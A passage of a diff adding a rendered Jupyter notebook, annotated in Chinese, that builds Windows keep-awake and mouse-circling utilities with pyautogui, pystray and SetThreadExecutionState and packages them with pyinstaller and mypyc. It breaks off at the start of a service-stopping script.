+<div class=" highlight hl-ipython3"><pre><span></span>%%bash
+pip<span class="w"> </span>install<span class="w"> </span>pyautogui<span class="w"> </span>pynput
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">import</span> <span class="nn">tkinter</span> <span class="k">as</span> <span class="nn">tk</span>
+<span class="kn">import</span> <span class="nn">pyautogui</span>
+<span class="kn">import</span> <span class="nn">math</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">from</span> <span class="nn">pynput</span> <span class="kn">import</span> <span class="n">keyboard</span>
+
+<span class="k">class</span> <span class="nc">MouseCircleApp</span><span class="p">:</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">root</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">root</span> <span class="o">=</span> <span class="n">root</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">root</span><span class="o">.</span><span class="n">title</span><span class="p">(</span><span class="s1">&#39;Mouse Circle App&#39;</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">root</span><span class="o">.</span><span class="n">geometry</span><span class="p">(</span><span class="s1">&#39;300x100&#39;</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">root</span><span class="o">.</span><span class="n">attributes</span><span class="p">(</span><span class="s1">&#39;-topmost&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">running</span> <span class="o">=</span> <span class="kc">False</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">thread</span> <span class="o">=</span> <span class="kc">None</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">button</span> <span class="o">=</span> <span class="n">tk</span><span class="o">.</span><span class="n">Button</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="s1">&#39;Start Circle&#39;</span><span class="p">,</span> <span class="n">command</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">toggle_circle</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">button</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="n">expand</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+        
+        <span class="bp">self</span><span class="o">.</span><span class="n">listener</span> <span class="o">=</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">Listener</span><span class="p">(</span><span class="n">on_press</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">on_key_press</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">listener</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+    <span class="k">def</span> <span class="nf">toggle_circle</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">running</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">running</span> <span class="o">=</span> <span class="kc">True</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">button</span><span class="o">.</span><span class="n">config</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s1">&#39;Stop Circle&#39;</span><span class="p">)</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">start_circle</span><span class="p">)</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">running</span> <span class="o">=</span> <span class="kc">False</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">button</span><span class="o">.</span><span class="n">config</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s1">&#39;Start Circle&#39;</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">start_circle</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">radius</span> <span class="o">=</span> <span class="mi">100</span>
+        <span class="n">center_x</span><span class="p">,</span> <span class="n">center_y</span> <span class="o">=</span> <span class="n">pyautogui</span><span class="o">.</span><span class="n">size</span><span class="p">()</span><span class="o">.</span><span class="n">width</span> <span class="o">//</span> <span class="mi">2</span><span class="p">,</span> <span class="n">pyautogui</span><span class="o">.</span><span class="n">size</span><span class="p">()</span><span class="o">.</span><span class="n">height</span> <span class="o">//</span> <span class="mi">2</span>
+        <span class="n">angle_step</span> <span class="o">=</span> <span class="mi">5</span>
+
+        <span class="k">while</span> <span class="bp">self</span><span class="o">.</span><span class="n">running</span><span class="p">:</span>
+            <span class="k">for</span> <span class="n">angle</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">360</span><span class="p">,</span> <span class="n">angle_step</span><span class="p">):</span>
+                <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">running</span><span class="p">:</span>
+                    <span class="k">break</span>
+                <span class="n">radian</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">radians</span><span class="p">(</span><span class="n">angle</span><span class="p">)</span>
+                <span class="n">x</span> <span class="o">=</span> <span class="n">center_x</span> <span class="o">+</span> <span class="n">radius</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">cos</span><span class="p">(</span><span class="n">radian</span><span class="p">)</span>
+                <span class="n">y</span> <span class="o">=</span> <span class="n">center_y</span> <span class="o">+</span> <span class="n">radius</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">sin</span><span class="p">(</span><span class="n">radian</span><span class="p">)</span>
+                <span class="n">pyautogui</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">on_key_press</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">Key</span><span class="o">.</span><span class="n">esc</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">running</span> <span class="o">=</span> <span class="kc">False</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">button</span><span class="o">.</span><span class="n">config</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s1">&#39;Start Circle&#39;</span><span class="p">)</span>
+            <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">thread</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">thread</span><span class="o">.</span><span class="n">is_alive</span><span class="p">():</span>
+                <span class="bp">self</span><span class="o">.</span><span class="n">thread</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">root</span> <span class="o">=</span> <span class="n">tk</span><span class="o">.</span><span class="n">Tk</span><span class="p">()</span>
+    <span class="n">app</span> <span class="o">=</span> <span class="n">MouseCircleApp</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
+    <span class="n">root</span><span class="o">.</span><span class="n">mainloop</span><span class="p">()</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span>%%bash
+pyinstaller<span class="w"> </span>--onefile<span class="w"> </span>--noconsole<span class="w"> </span>circle.py
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+<div class="cell border-box-sizing text_cell rendered"><div class="prompt input_prompt">
+</div><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<hr />
+<p><code>awake.py</code></p>
+<p>使用 <code>ctypes</code> 库来调用 Windows API <code>SetThreadExecutionState</code> 防止系统进入睡眠或关闭显示器。</p>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span>%%bash
+pip<span class="w"> </span>install<span class="w"> </span>pystray<span class="w"> </span>pillow
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">import</span> <span class="nn">ctypes</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">pyautogui</span>
+<span class="kn">import</span> <span class="nn">math</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="kn">import</span> <span class="nn">tkinter</span> <span class="k">as</span> <span class="nn">tk</span>
+<span class="kn">from</span> <span class="nn">pystray</span> <span class="kn">import</span> <span class="n">Icon</span><span class="p">,</span> <span class="n">MenuItem</span><span class="p">,</span> <span class="n">Menu</span>
+<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+<span class="kn">from</span> <span class="nn">pynput</span> <span class="kn">import</span> <span class="n">keyboard</span>
+
+<span class="c1"># Constants for preventing sleep using SetThreadExecutionState API</span>
+<span class="n">ES_CONTINUOUS</span> <span class="o">=</span> <span class="mh">0x80000000</span>  <span class="c1"># Ensure the state is reset when the program exits</span>
+<span class="n">ES_DISPLAY_REQUIRED</span> <span class="o">=</span> <span class="mh">0x00000002</span>  <span class="c1"># Prevent the display from turning off</span>
+<span class="n">ES_SYSTEM_REQUIRED</span> <span class="o">=</span> <span class="mh">0x00000001</span>  <span class="c1"># Prevent the system from entering sleep</span>
+
+<span class="c1"># Global variables for mouse circle functionality</span>
+<span class="n">running</span> <span class="o">=</span> <span class="kc">False</span>
+<span class="n">circle_thread</span> <span class="o">=</span> <span class="kc">None</span>
+<span class="n">button</span> <span class="o">=</span> <span class="kc">None</span>
+
+<span class="k">def</span> <span class="nf">prevent_sleep</span><span class="p">():</span>
+    <span class="c1"># Call the Windows API to prevent sleep and display off</span>
+    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">SetThreadExecutionState</span><span class="p">(</span>
+        <span class="n">ES_CONTINUOUS</span> <span class="o">|</span> <span class="n">ES_DISPLAY_REQUIRED</span> <span class="o">|</span> <span class="n">ES_SYSTEM_REQUIRED</span>
+    <span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">allow_sleep</span><span class="p">():</span>
+    <span class="c1"># Reset the system to allow sleep and display off</span>
+    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">SetThreadExecutionState</span><span class="p">(</span><span class="n">ES_CONTINUOUS</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">keep_awake</span><span class="p">():</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="c1"># Function to simulate user activity to keep the system awake</span>
+        <span class="n">prevent_sleep</span><span class="p">()</span>
+        <span class="n">pyautogui</span><span class="o">.</span><span class="n">move</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>  <span class="c1"># Slight mouse movement to prevent idle state</span>
+        <span class="n">pyautogui</span><span class="o">.</span><span class="n">move</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>  <span class="c1"># Move back to original position</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">60</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>  <span class="c1"># Sleep for 3 minutes before repeating</span>
+
+<span class="k">def</span> <span class="nf">on_quit</span><span class="p">(</span><span class="n">icon</span><span class="p">,</span> <span class="n">root</span><span class="p">):</span>
+    <span class="c1"># Handle the quit action from the system tray menu</span>
+    <span class="n">icon</span><span class="o">.</span><span class="n">stop</span><span class="p">()</span>  <span class="c1"># Stop the tray icon</span>
+    <span class="n">allow_sleep</span><span class="p">()</span>  <span class="c1"># Allow the system to sleep again</span>
+    <span class="n">root</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>  <span class="c1"># Quit the Tkinter main loop</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># Ensure the process exits completely</span>
+
+<span class="k">def</span> <span class="nf">show_window</span><span class="p">(</span><span class="n">root</span><span class="p">):</span>
+    <span class="c1"># Show the main application window</span>
+    <span class="n">root</span><span class="o">.</span><span class="n">deiconify</span><span class="p">()</span>
+    <span class="n">root</span><span class="o">.</span><span class="n">attributes</span><span class="p">(</span><span class="s1">&#39;-topmost&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>  <span class="c1"># Bring the window to the front</span>
+
+<span class="k">def</span> <span class="nf">hide_window</span><span class="p">(</span><span class="n">root</span><span class="p">):</span>
+    <span class="c1"># Hide the main application window</span>
+    <span class="n">root</span><span class="o">.</span><span class="n">withdraw</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">create_tray_icon</span><span class="p">(</span><span class="n">root</span><span class="p">):</span>
+    <span class="c1"># Create a system tray icon with a menu</span>
+    <span class="n">image</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;RGB&#39;</span><span class="p">,</span> <span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="mi">64</span><span class="p">),</span> <span class="n">color</span><span class="o">=</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>  <span class="c1"># Simple black icon</span>
+    <span class="n">menu</span> <span class="o">=</span> <span class="n">Menu</span><span class="p">(</span>
+        <span class="n">MenuItem</span><span class="p">(</span><span class="s1">&#39;Open Window&#39;</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">icon</span><span class="p">,</span> <span class="n">item</span><span class="p">:</span> <span class="n">show_window</span><span class="p">(</span><span class="n">root</span><span class="p">),</span> <span class="n">default</span><span class="o">=</span><span class="kc">True</span><span class="p">),</span>
+        <span class="n">MenuItem</span><span class="p">(</span><span class="s1">&#39;Exit&#39;</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">icon</span><span class="p">,</span> <span class="n">item</span><span class="p">:</span> <span class="n">on_quit</span><span class="p">(</span><span class="n">icon</span><span class="p">,</span> <span class="n">root</span><span class="p">))</span>
+    <span class="p">)</span>
+    <span class="k">return</span> <span class="n">Icon</span><span class="p">(</span><span class="s1">&#39;Awake&#39;</span><span class="p">,</span> <span class="n">image</span><span class="p">,</span> <span class="s1">&#39;Keep Awake&#39;</span><span class="p">,</span> <span class="n">menu</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">toggle_circle</span><span class="p">(</span><span class="n">button</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">running</span><span class="p">,</span> <span class="n">circle_thread</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">running</span><span class="p">:</span>
+        <span class="n">button</span><span class="o">.</span><span class="n">config</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s1">&#39;Stop Circle&#39;</span><span class="p">)</span>
+        <span class="c1"># Start the circle motion</span>
+        <span class="n">running</span> <span class="o">=</span> <span class="kc">True</span>
+        <span class="n">circle_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">start_circle</span><span class="p">)</span>
+        <span class="n">circle_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">button</span><span class="o">.</span><span class="n">config</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s1">&#39;Start Circle&#39;</span><span class="p">)</span>
+        <span class="c1"># Stop the circle motion</span>
+        <span class="n">running</span> <span class="o">=</span> <span class="kc">False</span>
+        <span class="k">if</span> <span class="n">circle_thread</span> <span class="ow">and</span> <span class="n">circle_thread</span><span class="o">.</span><span class="n">is_alive</span><span class="p">():</span>
+            <span class="n">circle_thread</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">start_circle</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">running</span>
+    <span class="n">radius</span> <span class="o">=</span> <span class="mi">100</span>
+    <span class="n">center_x</span><span class="p">,</span> <span class="n">center_y</span> <span class="o">=</span> <span class="n">pyautogui</span><span class="o">.</span><span class="n">size</span><span class="p">()</span><span class="o">.</span><span class="n">width</span> <span class="o">//</span> <span class="mi">2</span><span class="p">,</span> <span class="n">pyautogui</span><span class="o">.</span><span class="n">size</span><span class="p">()</span><span class="o">.</span><span class="n">height</span> <span class="o">//</span> <span class="mi">2</span>
+    <span class="n">angle_step</span> <span class="o">=</span> <span class="mi">5</span>
+
+    <span class="k">while</span> <span class="n">running</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">angle</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">360</span><span class="p">,</span> <span class="n">angle_step</span><span class="p">):</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">running</span><span class="p">:</span>
+                <span class="k">break</span>
+            <span class="n">radian</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">radians</span><span class="p">(</span><span class="n">angle</span><span class="p">)</span>
+            <span class="n">x</span> <span class="o">=</span> <span class="n">center_x</span> <span class="o">+</span> <span class="n">radius</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">cos</span><span class="p">(</span><span class="n">radian</span><span class="p">)</span>
+            <span class="n">y</span> <span class="o">=</span> <span class="n">center_y</span> <span class="o">+</span> <span class="n">radius</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">sin</span><span class="p">(</span><span class="n">radian</span><span class="p">)</span>
+            <span class="n">pyautogui</span><span class="o">.</span><span class="n">moveTo</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">on_key_press</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">button</span>
+    <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">Key</span><span class="o">.</span><span class="n">esc</span><span class="p">:</span>
+        <span class="n">toggle_circle</span><span class="p">(</span><span class="n">button</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="c1"># Set up the main Tkinter window</span>
+    <span class="n">root</span> <span class="o">=</span> <span class="n">tk</span><span class="o">.</span><span class="n">Tk</span><span class="p">()</span>
+    <span class="n">root</span><span class="o">.</span><span class="n">title</span><span class="p">(</span><span class="s1">&#39;Awake &amp; Circle&#39;</span><span class="p">)</span>
+    <span class="n">root</span><span class="o">.</span><span class="n">geometry</span><span class="p">(</span><span class="s1">&#39;350x100&#39;</span><span class="p">)</span>
+    <span class="n">root</span><span class="o">.</span><span class="n">resizable</span><span class="p">(</span><span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>  <span class="c1"># Fix the window size</span>
+    <span class="n">root</span><span class="o">.</span><span class="n">attributes</span><span class="p">(</span><span class="s1">&#39;-topmost&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>  <span class="c1"># Keep the window on top</span>
+    <span class="n">root</span><span class="o">.</span><span class="n">protocol</span><span class="p">(</span><span class="s1">&#39;WM_DELETE_WINDOW&#39;</span><span class="p">,</span> <span class="k">lambda</span><span class="p">:</span> <span class="n">hide_window</span><span class="p">(</span><span class="n">root</span><span class="p">))</span>  <span class="c1"># Hide on close</span>
+
+    <span class="c1"># Create the mouse circle button in the main window</span>
+    <span class="k">global</span> <span class="n">button</span>
+    <span class="n">button</span> <span class="o">=</span> <span class="n">tk</span><span class="o">.</span><span class="n">Button</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="s1">&#39;Start Circle&#39;</span><span class="p">,</span> <span class="n">command</span><span class="o">=</span><span class="k">lambda</span><span class="p">:</span> <span class="n">toggle_circle</span><span class="p">(</span><span class="n">button</span><span class="p">))</span>
+    <span class="n">button</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="n">expand</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+
+    <span class="c1"># Start a background thread to keep the system awake</span>
+    <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">keep_awake</span><span class="p">,</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+    <span class="c1"># Start the keyboard listener</span>
+    <span class="n">listener</span> <span class="o">=</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">Listener</span><span class="p">(</span><span class="n">on_press</span><span class="o">=</span><span class="n">on_key_press</span><span class="p">)</span>
+    <span class="n">listener</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+    <span class="c1"># Create and run the system tray icon</span>
+    <span class="n">icon</span> <span class="o">=</span> <span class="n">create_tray_icon</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
+    <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">icon</span><span class="o">.</span><span class="n">run</span><span class="p">,</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+    <span class="c1"># Run the Tkinter main loop</span>
+    <span class="n">root</span><span class="o">.</span><span class="n">mainloop</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+<div class="cell border-box-sizing text_cell rendered"><div class="prompt input_prompt">
+</div><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<p>说明：</p>
+<ol>
+<li><p><code>SetThreadExecutionState</code>：</p>
+<ul>
+<li><code>ES_CONTINUOUS</code>：保持该设置直到下一次调用。</li>
+<li><code>ES_DISPLAY_REQUIRED</code>：防止屏幕关闭。</li>
+<li><code>ES_SYSTEM_REQUIRED</code>：防止系统进入睡眠。</li>
+</ul>
+</li>
+<li><p><strong>防止和恢复</strong>：</p>
+<ul>
+<li><code>prevent_sleep()</code>：调用后，系统不会进入睡眠或关闭显示器。</li>
+<li><code>allow_sleep()</code>：调用后恢复系统默认的电源管理设置。</li>
+</ul>
+</li>
+<li><p><strong>运行和停止</strong>：</p>
+<ul>
+<li>运行脚本后，它会每分钟保持系统活跃，防止自动熄屏和锁屏。</li>
+<li>使用 <code>Esc</code> 和菜单选项 <code>Exit</code> 停止脚本运行，并恢复系统默认设置。</li>
+</ul>
+</li>
+</ol>
+<p>注意：</p>
+<ul>
+<li>这个脚本仅在 Windows 操作系统上有效。</li>
+<li><code>SetThreadExecutionState</code> 是 Windows 提供的 API，用于管理电源和系统状态。务必小心使用，防止意外阻止系统进入节能状态。</li>
+</ul>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span>%%bash
+pyinstaller<span class="w"> </span>--onefile<span class="w"> </span>--noconsole<span class="w"> </span>awake.py
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+<div class="cell border-box-sizing text_cell rendered"><div class="prompt input_prompt">
+</div><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<hr />
+<p><code>setup.py</code></p>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">setuptools</span> <span class="kn">import</span> <span class="n">setup</span>
+<span class="kn">from</span> <span class="nn">mypyc.build</span> <span class="kn">import</span> <span class="n">mypycify</span>
+
+<span class="n">setup</span><span class="p">(</span>
+    <span class="n">name</span><span class="o">=</span><span class="s1">&#39;awake&#39;</span><span class="p">,</span>
+    <span class="n">ext_modules</span><span class="o">=</span><span class="n">mypycify</span><span class="p">([</span><span class="s1">&#39;awake.py&#39;</span><span class="p">]),</span>
+    <span class="n">zip_safe</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
+<span class="p">)</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span>%%bash
+pip<span class="w"> </span>install<span class="w"> </span>mypy
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span>%%bash
+python<span class="w"> </span>setup.py<span class="w"> </span>build_ext<span class="w"> </span>--inplace
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+<div class="cell border-box-sizing text_cell rendered"><div class="prompt input_prompt">
+</div><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<hr />
+<p><code>main.py</code></p>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">import</span> <span class="nn">awake</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">awake</span><span class="o">.</span><span class="n">main</span><span class="p">()</span>  <span class="c1"># 调用编译后的模块的 main 函数</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span>%%bash
+pyinstaller<span class="w"> </span>--onefile<span class="w"> </span>main.py
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+<div class="cell border-box-sizing text_cell rendered"><div class="prompt input_prompt">
+</div><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<hr />
+<p>WMI 服务管理与清理自动化</p>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+<div class="prompt input_prompt">In&nbsp;[&nbsp;]:</div>
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">shutil</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="k">def</span> <span class="nf">stop_and_disable_service</span><span class="p">(</span><span class="n">service_name</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&#39;&#39;&#39;停止并禁用指定的服务&#39;&#39;&#39;</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="c1"># 停止服务</span>
+        <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;sc&#39;</span><span class="p">,</span> <span class="s1">&#39;stop&#39;</span><span class="p">,</span> <span class="n">service_name</span><span class="p">],</span> <span class="n">check</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;服务已停止：</span><span class="si">{</span><span class="n">service_name</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+
+        <span class="c1"># 禁用服务</span>
